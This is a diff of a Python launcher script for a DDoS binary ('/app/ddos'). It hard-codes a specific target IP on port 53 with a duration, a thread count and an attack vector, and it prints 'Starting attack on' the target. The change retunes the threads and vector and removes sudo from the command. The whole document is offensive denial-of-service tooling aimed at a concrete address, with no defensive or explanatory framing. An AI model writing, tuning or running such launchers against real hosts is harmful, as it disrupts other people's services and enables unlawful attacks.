@@ -8,8 +8,8 @@ BINARY = "/app/ddos"
 TARGET_IP = "147.75.202.61"
 TARGET_PORT = "53"
 DURATION = "300"
-THREADS = "640"
-VECTOR = "2"
+THREADS = "64"
+VECTOR = "1"
 
 def attack():
     # Make binary executable
@@ -21,7 +21,7 @@ def attack():
         sys.exit(1)
     
     # Build command with sudo
-    cmd = ['sudo', BINARY, TARGET_IP, TARGET_PORT, DURATION, THREADS, VECTOR]
+    cmd = [BINARY, TARGET_IP, TARGET_PORT, DURATION, THREADS, VECTOR]
     
     print(f"🔥 Starting attack on {TARGET_IP}:{TARGET_PORT}")
     print(f"   Duration: {DURATION}s | Threads: {THREADS} | Vector: {VECTOR}")
